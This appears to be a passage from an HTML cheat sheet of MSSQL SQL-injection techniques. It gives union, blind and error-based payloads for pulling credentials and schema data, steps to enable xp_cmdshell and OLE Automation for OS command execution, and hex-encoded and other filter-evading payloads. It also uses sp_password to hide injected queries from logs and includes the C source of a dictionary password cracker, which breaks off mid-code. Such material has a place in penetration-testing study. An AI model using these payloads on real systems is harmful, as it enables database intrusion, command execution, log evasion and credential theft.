name="Testing_Version_45404268473343_22317706867605192"></a><b>Testing Version</b></h3><div style="font-family: Courier New;"><ul><li><font size="3">@@VERSION</font></li><li><font size="3">VERSION()</font></li></ul></div><br><h3><a id="Retrieving_user_names_password" name="Retrieving_user_names_password"></a><b>Database Credentials</b></h3><ul><li><font size="3">Database.Table: <br></font></li><ul><li><font size="3"><font face="courier new">master..syslogins, master..sysprocesses</font></font></li></ul><li><font size="3">Columns: <br></font></li><ul><li><font size="3"><font face="courier new">name, loginameCurrent User: user, system_user, suser_sname(), is_srvrolemember('sysadmin')</font></font></li></ul><li><font size="3">Database Credentials: <br></font></li><ul><li><font size="3"><font face="courier new">SELECT user, password FROM master.dbo.sysxlogins</font></font></li></ul></ul><br><font size="3" face="courier new"><i style="font-family: Verdana;">Example: </i><br></font><ul><li><font size="3" face="courier new">SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID; </font><font size="3"><i>-- Returns current user</i></font></li><li style="font-family: Courier New;"><font size="3">SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);</font><font size="3"><font face="verdana"><i>-- Is Admin?</i></font></font></li></ul><div><b><br></b><h3><a id="Database_Server_Hostname_24749" name="Database_Server_Hostname_24749"></a><b>Database Server Hostname</b></h3><ul style="font-family: Courier New;"><li><font size="3">@@servername</font></li><li><font size="3">SERVERPROPERTY()</font></li></ul><i><font size="3"><br></font></i><div><i><font size="3">Example:</font></i> <font size="3"><font face="courier new"><br>SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition') -- </font><br><i>Only available &gt;= SQL Server 2005</i></font></div><br><h3><a id="Listing_Databases_901208701422" name="Listing_Databases_901208701422"></a><b>Database Names</b></h3><ul><li><font size="3">Table: <font face="courier new">master..sysdatabases</font></font></li><li><font size="3">Column: <font face="courier new">name</font></font></li><li><font size="3">Function:<font face="courier new"> DB_NAME(i)</font></font></li></ul><i><font size="3"><br></font></i><div><i><font size="3">Example: </font></i><font size="3"><br></font><ul><li><font size="3" face="courier new">SELECT name FROM master..sysdatabases;</font></li><li><font size="3"><font face="courier new">SELECT DB_NAME(5);</font><br></font></li></ul></div><br>We
 can retrieve the tables/columns from two different databases, 
information_schema.tables, information_schema.columns or from 
master..sysobjects, masters..syscolumns.</div><br><h3><a id="Tables_Columns_006405132822692" name="Tables_Columns_006405132822692"></a>Tables &amp; Columns</h3><h4><a id="Retrieving_Tables_912017414346" name="Retrieving_Tables_912017414346"></a><b>Retrieving Tables</b></h4><ul><li><font size="3">Union:</font></li><ul><li><font size="3"><font face="courier new">UNION SELECT name FROM master..sysobjects WHERE xtype='U' --</font></font></li></ul><li><font size="3">Blind:</font></li><ul><li><font size="3" face="courier new">AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &nbsp;&gt; 'A'</font></li></ul><li><font size="3">Error Based:</font></li><ul><li><font size="3"><font face="courier new">AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)</font></font></li><li><font size="3"><font face="'courier new'">AND
 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE 
table_name NOT IN(SELECT TOP 1 table_name FROM 
information_schema.tables))</font></font></li></ul></ul><i><font size="3"><font size="3"><br></font>Note:<br>Xtype = 'U' is for User-defined tables. You can use 'V' for views.</font></i><br><br><h4><a id="Retrieving_Columns_71532329893" name="Retrieving_Columns_71532329893"></a><b>Retrieving Columns</b></h4><ul><li><font size="3">Union:</font></li><ul><li><font size="3" face="courier new">UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = '<i>tablename</i>')</font></li></ul><li><font size="3">Blind:</font></li><ul><li><font size="3" face="courier new">AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns &nbsp;&gt; 'A'</font></li></ul><li><font size="3">Error Based:</font></li><ul><li><font size="3"><font face="courier new">AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)</font></font></li><li><font face="'courier new'">AND
 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE 
column_name NOT IN(SELECT TOP 1 column_name FROM 
information_schema.columns))</font></li></ul></ul><br><h4><a id="Retrieving_Multiple_Tables_Col_0027392041642497755" name="Retrieving_Multiple_Tables_Col_0027392041642497755"></a><b>Retrieving Multiple Tables/Columns at once</b></h4><div>The
 following 3 queries will create a temporary table/column and insert all
 the user-defined tables into it, it will then dump the table content 
and finish by deleting the table. &nbsp;</div><br><ul><li>Create Temp Table/Column and Insert Data:</li><ul><li><font face="'courier new'">AND
 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' 
'+name FROM sysobjects WHERE xtype='U' AND name&gt;@xy SELECT @xy AS xy 
INTO TMP_DB END;</font></li></ul><li>Dump Content:</li><ul><li><font face="'courier new'">AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM&nbsp;<font face="'courier new'">TMP_DB</font>);</font><br></li></ul><li>Delete Table:</li><ul><li><font face="'courier new'">AND 1=0; DROP TABLE TMP_DB;</font></li></ul></ul><br><div><i><font size="3">Note:<br>You can encode your query in hex to "obfuscate" your attack.</font></i></div><div><i><font size="3"><font face="'Courier New'">'
 and 1=0; DECLARE @S VARCHAR(4000) SET 
@S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC 
(@S);--sp_password</font></font></i><br></div><b><br></b><h3><a id="OPENROWSET_Attacks_01821536291" name="OPENROWSET_Attacks_01821536291"></a><b>OPENROWSET Attacks</b></h3><div><font face="'Courier New'">SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"')</font></div><div><br><h3><a id="System_Command_Execution_62486" name="System_Command_Execution_62486"></a><b>System Command Execution</b></h3>Include an extended stored procedure named xp_cmdshell that can be used to execute operating system commands.</div><br><div><font face="'Courier New'">EXEC master.dbo.xp_cmdshell '<i>cmd</i>'</font></div><br><div>Prior to MSSQL 2005, xp_cmdshell is disabled by default, but can easily be activated with the following queries:</div><br><div><font face="'Courier New'">EXEC sp_configure 'show advanced options', 1</font></div><div><font face="'Courier New'">EXEC sp_configure reconfigure</font></div><div><font face="'Courier New'">EXEC sp_configure 'xp_cmdshell', 1</font></div><div><font face="'Courier New'">EXEC sp_configure reconfigure</font></div><br><font face="Verdana">Alternatively, you can create your own procedure to achieve the same results</font><br><br><div><font face="'Courier New'">DECLARE @execmd INT</font></div><div><font face="'Courier New'">EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT</font></div><div><font face="'Courier New'">EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'</font></div><br><div><font face="Verdana">If the SQL version is higher than 2000, you will have to run additional queries in order the execute the previous command.</font><br><br><div><font face="'Courier New'">EXEC sp_configure 'show advanced options', 1</font></div><div><font face="'Courier New'">EXEC sp_configure reconfigure</font></div><div><font face="'Courier New'">EXEC sp_configure 'OLE Automation Procedures', 1</font></div><div><font face="'Courier New'">EXEC sp_configure reconfigure<br><br></font></div><div><i>Example:&nbsp;</i></div><ul><li><font face="'courier new'">'
 IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE 
TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF 
EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id 
(N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1)
 BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int,
 config_value int, run_value int) INSERT %23xp_cmdshell EXEC 
master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM 
%23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir 
varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT 
@a='' SELECT @a=Replace(@a%2B'&lt;br&gt;&lt;/font&gt;&lt;font 
color="black"&gt;'%2Bdir,'&lt;dir&gt;','&lt;/font&gt;&lt;font 
color="orange"&gt;') FROM %23Data WHERE dir&gt;@a DROP TABLE %23Data END
 ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END 
ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--</font></li><li><font face="'courier new'">' UNION SELECT tbl FROM TMP_DB--</font></li><li><font face="'courier new'">' DROP TABLE TMP_DB--</font></li></ul><br>This
 example checks to see if xp_cmdshell is loaded, if it is, it checks if 
it is active and then proceeds to run the 'dir' command and inserts the 
results into TMP_DB.</div><br><div><h3><a id="SP_PASSWORD_Hiding_Query_01275" name="SP_PASSWORD_Hiding_Query_01275"></a><b>SP_PASSWORD (Hiding Query)</b></h3>Appending <font face="courier new">sp_password</font> to the end of the query will hide it from T-SQL logs as a security measure.</div><b><br></b><div><i>Example:&nbsp;</i><font face="'courier new'">' and 1=1--sp_password</font></div><br><div><font face="'Courier New'">-- 'sp_password' was found in the text of this event.</font></div><div><font face="'Courier New'">-- The text has been replaced with this comment for security reasons.</font></div><br><h3><a id="Stacked_Queries_74329470796510" name="Stacked_Queries_74329470796510"></a>Stacked Queries</h3><ul><li><font face="'Courier New'">' AND 1=0 INSERT INTO ([<i>column1</i>], [<i>column2</i>]) VALUES ('<i>value1</i>', '<i>value2</i>')</font></li></ul><br><h3><a id="Fuzzing_and_Obfuscation_688072_8761287548374126" name="Fuzzing_and_Obfuscation_688072_8761287548374126"></a>Fuzzing and Obfuscation</h3><h4><a id="Encodings_765702735632658_2887" name="Encodings_765702735632658_2887"></a>Encodings</h4><ul><li><p>Hex</p></li><ul><li><i><font size="3"><font face="'Courier New'">' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--sp_password</font></font></i></li></ul><li>URL Encoded</li><ul><li><font size="3"><font face="'courier new'"><i>%53%45%4c%45%43%54%20%31%20%46%52%4f%4d%20%64%75%61%6c</i></font></font></li></ul><li><font size="3">Double URL Encoded</font></li><ul><li><font size="3"><font face="'Courier New'"><i>%2553%2545%254c%2545%2543%2554%2520%2531%2520%2546%2552%254f%254d%2520%2564%2575%2561%256c</i></font><br></font></li></ul></ul><ul><li><p>Unicode</p></li><ul><li><font face="'Courier New'"><font size="3"><i>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0031%u0020%u0046%u0052%u004f%u004d%u0020%u0064%u0075%u0061%u006c</i></font></font></li></ul><li><p>HTML Entities (Needs to be verified)</p></li><ul><li><font face="'Courier New'"><font size="3"><i>&amp;#65;&amp;#78;&amp;#68;&amp;#32;&amp;#49;&amp;#61;&amp;#49; (&amp;# has to be URL Encoded)<br></i></font></font></li><li><font face="'Courier New'"><font size="3"><i>%26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B</i></font></font></li></ul></ul><h4><a id="Allowed_Intermediary_Character_9818568086386211" name="Allowed_Intermediary_Character_9818568086386211"></a><i><font size="2"><b>Allowed Intermediary Characters</b></font></i></h4><ul><li><font face="'Courier New'">01-1F</font></li><li><font face="'Courier New'">25</font></li></ul><br><div><i>Example:</i></div><ul><li><font face="'courier new'">S%E%L%E%C%T%01<i>column</i>%02FROM%03<i>table</i>%00</font></li><li><font face="'courier new'">A%%ND 1=%%%%%%%%1<br></font></li></ul><br><div><i>Note:</i></div><div><i>The percentage signs in between keywords is only possible on ASP</i></div><br><div><ul><li><font face="courier new">28</font></li><li><font face="courier new">29</font></li></ul><br><font size="3"><i>Example:&nbsp;</i><font face="'courier new'">UNION(SELECT(<i>column</i>)FROM(<i>table</i>))</font></font></div><i><br></i><ul><li><font face="'Courier New'">5B</font></li><li><font face="'Courier New'">5D</font></li><li><font face="'Courier New'">22</font></li></ul><br><div><i>Example:</i><font face="'Courier New'"> SELECT"table_name"FROM[information_schema].[tables]</font></div><h4><a id="Allowed_Intermediary_Character_770260241426459" name="Allowed_Intermediary_Character_770260241426459"></a><font size="2"><b><i>Allowed Intermediary Characters after AND/OR</i></b></font></h4><ul><li><font face="'Courier New'"><font size="3">01-1F</font></font></li><li><font face="'Courier New'"><font size="3">2B</font></font></li><li><font face="'Courier New'"><font size="3">2D</font></font></li><li><font face="'Courier New'"><font size="3">2E</font></font></li><li><font face="'Courier New'"><font size="3">5C</font></font></li><li><font face="'Courier New'"><font size="3">7E</font></font></li></ul><br><font size="3"><i>Example<font face="'Courier New'">:&nbsp;</font></i></font><font size="3"><font face="courier new">SELECT 1FROM[<i>table</i></font></font><font size="3"><font face="courier new">]WHERE\1=\1AND\1=\1</font></font><div><font size="3"><br></font><font size="3"><i>Note:</i></font></div><div><font size="3"><i>The backslash doesn't seem to work with MSSQL 2000</i><br></font><p><br></p><h3><a id="MSSQL_Password_Hashing_5148090" name="MSSQL_Password_Hashing_5148090"></a>MSSQL Password Hashing</h3><font face="Verdana">Passwords
 begin with 0x0100, the first for bytes following the 0x are a constant;
 the next eight bytes are the hash salt and the remaining 80 bytes are 
two hashes, the first 40 bytes are a case-sensitive hash of the 
password, while the second 40 bytes are the uppercased version.</font><br><br><div><i>Example:</i></div><div><font face="'Courier New'">0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE9 ...<br>1C0784B911D76BF4EB124550ACABDFD1457</font></div><br><h3><a id="MSSQL_Password_Cracker_9522853_804210340199028" name="MSSQL_Password_Cracker_9522853_804210340199028"></a>MSSQL Password Cracker</h3><div><font size="1"><font face="'Courier New'">/////////////////////////////////////////////////////////////////////////////////</font></font></div><div><font size="1"><font face="'Courier New'">//</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SQLCrackCl</font></font></div><div><font size="1"><font face="'Courier New'">//</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; This will perform a dictionary attack against the</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; upper-cased hash for a password. Once this</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; has been discovered try all case variant to work</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; out the case sensitive password.</font></font></div><div><font size="1"><font face="'Courier New'">//</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; This code was written by David Litchfield to</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; demonstrate how Microsoft SQL Server 2000</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; passwords can be attacked. This can be</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; optimized considerably by not using the CryptoAPI.</font></font></div><div><font size="1"><font face="'Courier New'">//</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Compile with VC++ and link with advapi32.lib</font></font></div><div><font size="1"><font face="'Courier New'">// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Ensure the Platform SDK has been installed, too!)</font></font></div><div><font size="1"><font face="'Courier New'">//</font></font></div><div><font size="1"><font face="'Courier New'">//////////////////////////////////////////////////////////////////////////////////</font></font></div><div><font size="1"><font face="'Courier New'">#include &lt;stdio.h&gt;</font></font></div><div><font size="1"><font face="'Courier New'">#include &lt;windows.h&gt;</font></font></div><div><font size="1"><font face="'Courier New'">#include &lt;wincrypt.h&gt;</font></font></div><div><font size="1"><font face="'Courier New'">FILE *fd=NULL;</font></font></div><div><font size="1"><font face="'Courier New'">char *lerr = "\nLength Error!\n";</font></font></div><div><font size="1"><font face="'Courier New'">int wd=0;</font></font></div><div><font size="1"><font face="'Courier New'">int OpenPasswordFile(char *pwdfile);</font></font></div><div><font size="1"><font face="'Courier New'">int CrackPassword(char *hash);</font></font></div><div><font size="1"><font face="'Courier New'">int main(int argc, char *argv[])</font></font></div><div><font size="1"><font face="'Courier New'">{</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int err = 0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;if(argc !=3)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp;printf("\n\n*** SQLCrack *** \n\n");</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp;printf("C:\\&gt;%s hash passwd-file\n\n",argv[0]);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp;printf("David Litchfield 
(david@ngssoftware.com)\n");</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp;printf("24th June 2002\n");</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return 0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;err = OpenPasswordFile(argv[2]);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;if(err !=0)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; {</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return printf("\nThere was an error opening the password file %s\n",argv[2]);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;err = CrackPassword(argv[1]);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;fclose(fd);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;printf("\n\n%d",wd);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;return 0;</font></font></div><div><font size="1"><font face="'Courier New'">}</font></font></div><div><font size="1"><font face="'Courier New'">int OpenPasswordFile(char *pwdfile)</font></font></div><div><font size="1"><font face="'Courier New'">{</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;fd = fopen(pwdfile,"r");</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;if(fd)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return 0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;else</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return 1;</font></font></div><div><font size="1"><font face="'Courier New'">}</font></font></div><div><font size="1"><font face="'Courier New'">int CrackPassword(char *hash)</font></font></div><div><font size="1"><font face="'Courier New'">{</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;char phash[100]="";</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;char pheader[8]="";</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;char pkey[12]="";</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;char pnorm[44]="";</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;char pucase[44]="";</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;char pucfirst[8]="";</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;char wttf[44]="";</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;char uwttf[100]="";</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;char *wp=NULL;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;char *ptr=NULL;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;int cnt = 0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;int count = 0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;unsigned int key=0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;unsigned int t=0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;unsigned int address = 0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;unsigned char cmp=0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;unsigned char x=0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;HCRYPTPROV hProv=0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;HCRYPTHASH hHash;</font></font></div><div><font size="1"><font face="'Courier New'">DWORD hl=100;</font></font></div><div><font size="1"><font face="'Courier New'">unsigned char szhash[100]="";</font></font></div><div><font size="1"><font face="'Courier New'">int len=0;</font></font></div><div><font size="1"><font face="'Courier New'">if(strlen(hash) !=94)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return printf("\nThe password hash is too short!\n");</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}</font></font></div><div><font size="1"><font face="'Courier New'">if(hash[0]==0x30 &amp;&amp; (hash[1]== 'x' || hash[1] == 'X'))</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;hash = hash + 2;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;strncpy(pheader,hash,4);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;printf("\nHeader\t\t: %s",pheader);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if(strlen(pheader)!=4)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return printf("%s",lerr);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;hash = hash + 4;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;strncpy(pkey,hash,8);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;printf("\nRand key\t: %s",pkey);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if(strlen(pkey)!=8)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return printf("%s",lerr);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;hash = hash + 8;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;strncpy(pnorm,hash,40);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;printf("\nNormal\t\t: %s",pnorm);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if(strlen(pnorm)!=40)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return printf("%s",lerr);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;hash = hash + 40;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;strncpy(pucase,hash,40);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;printf("\nUpper Case\t: %s",pucase);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if(strlen(pucase)!=40)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return printf("%s",lerr);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;strncpy(pucfirst,pucase,2);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sscanf(pucfirst,"%x",&amp;cmp);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}</font></font></div><div><font size="1"><font face="'Courier New'">else</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return printf("The password hash has an invalid format!\n");</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;}</font></font></div><div><font size="1"><font face="'Courier New'">printf("\n\n &nbsp; &nbsp; &nbsp; Trying...\n");</font></font></div><div><font size="1"><font face="'Courier New'">if(!CryptAcquireContextW(&amp;hProv, NULL , NULL , PROV_RSA_FULL &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ,0))</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;{</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if(GetLastError()==NTE_BAD_KEYSET)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; 